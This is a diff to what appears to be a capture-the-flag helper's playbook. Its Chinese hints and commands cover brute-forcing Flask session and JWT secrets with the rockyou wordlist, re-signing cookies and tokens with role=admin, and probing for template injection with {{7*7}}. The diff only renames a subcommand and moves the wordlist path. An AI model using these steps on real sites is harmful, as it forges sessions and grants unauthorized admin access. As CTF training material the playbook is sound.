@@ -8,7 +8,7 @@
       "hint": "Flask 栈：先看 session cookie 是不是客户端签名（三段式），是就爆密钥改内容；模板渲染点试 SSTI。",
       "cmds": [
         "ctfctl req get \"$U/\" --head",
-        "ctfctl cookie flask-crack --cookie '<session 值>' -w /usr/share/wordlists/rockyou.txt",
+        "ctfctl cookie flask-unsign --cookie '<session 值>' -w ~/.local/share/wordlists/rockyou.txt",
         "ctfctl cookie flask-sign --cookie '<session 值>' --secret <爆出的密钥> --set role=admin",
         "curl -s \"$U/?name={{7*7}}\""
       ]
@@ -31,7 +31,7 @@
       "hint": "session 值在客户端（三段 base64 或 zlib）。能拿到/爆出密钥就能改任意字段；注意 Flask 时间戳必须回拨（比服务端新会被整块丢弃→500）。",
       "cmds": [
         "ctfctl cookie list --base \"$U\"",
-        "ctfctl cookie flask-crack -w /usr/share/wordlists/rockyou.txt --base \"$U\""
+        "ctfctl cookie flask-unsign -w ~/.local/share/wordlists/rockyou.txt --base \"$U\""
       ]
     },
     {
@@ -137,7 +137,7 @@
       "hint": "页面里有 JWT：解 payload 看角色/有效期；密钥泄露→重签；算法混用/none→绕过。",
       "cmds": [
         "ctfctl jwt decode \"$TOKEN\"",
-        "ctfctl jwt crack \"$TOKEN\" -w /usr/share/wordlists/rockyou.txt",
+        "ctfctl jwt crack \"$TOKEN\" -w ~/.local/share/wordlists/rockyou.txt",
         "ctfctl jwt sign \"$TOKEN\" --secret <密钥> --set role=admin"
       ]
     },
